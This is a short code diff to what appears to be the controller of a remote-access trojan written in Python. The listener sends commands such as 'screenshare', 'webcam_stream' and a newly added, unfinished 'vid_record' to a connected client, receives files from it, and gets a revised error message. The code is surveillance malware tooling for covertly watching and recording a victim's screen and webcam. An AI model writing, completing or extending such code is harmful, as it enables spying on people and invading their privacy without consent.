@@ -70,7 +70,7 @@ def Listener():
 
         while True:
 
-            Handler = input(f"{addr[0]}:{recv_data} ⇄ ")
+            Handler = input(f"{addr[0]}:{recv_data} ⇄    ")
             if Handler == "screenshare":       
                 conn.send(Handler.encode("utf-8"))
             elif Handler == "webcam_stream":
@@ -95,8 +95,9 @@ def Listener():
                         l = conn.recv(1024)
                         if not l: break
                         f.write(l)
-
-                # unfinished code
+            elif Handler == "vid_record":
+                conn.send(Handler.encode("utf-8"))
+                # Unfinished Code
 
 
 
@@ -109,5 +110,6 @@ if des >= "1":
     Listener()
 
 else:
-    pass
-
+    print(colored("[*] ERROR Invaild Argument, Exiting...", "red"))
+    while True:
+        break
